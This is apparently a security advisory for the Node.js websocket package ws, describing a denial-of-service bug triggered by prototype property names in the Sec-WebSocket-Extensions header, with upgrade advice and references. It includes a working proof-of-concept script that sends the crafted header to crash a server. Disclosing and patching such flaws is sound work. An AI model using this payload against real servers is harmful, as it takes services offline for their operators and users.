## Overview
[`ws`](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.

Affected versions of the package are vulnerable to Denial of Service (DoS) attacks. A specially crafted value of the `Sec-WebSocket-Extensions` header that used `Object.prototype` property names as extension or parameter names could be used to make a ws server crash.

**PoC:**

```js
const WebSocket = require('ws');
const net = require('net');

const wss = new WebSocket.Server({ port: 3000 }, function () {
  const payload = 'constructor';  // or ',;constructor'

  const request = [
    'GET / HTTP/1.1',
    'Connection: Upgrade',
    'Sec-WebSocket-Key: test',
    'Sec-WebSocket-Version: 8',
    `Sec-WebSocket-Extensions: ${payload}`,
    'Upgrade: websocket',
    '\r\n'
  ].join('\r\n');

  const socket = net.connect(3000, function () {
    socket.resume();
    socket.write(request);
  });
});
```

## Remediation
Upgrade `ws` to version 1.1.5, 3.3.1 or higher.

## References
- [GitHub Release Notes](https://github.com/websockets/ws/releases/tag/3.3.1)
- [GitHub Commit 3.3.1](https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a)
- [GitHub Commit 1.1.5](https://github.com/websockets/ws/commit/f8fdcd40ac8be7318a6ee41f5ceb7e77c995b407)
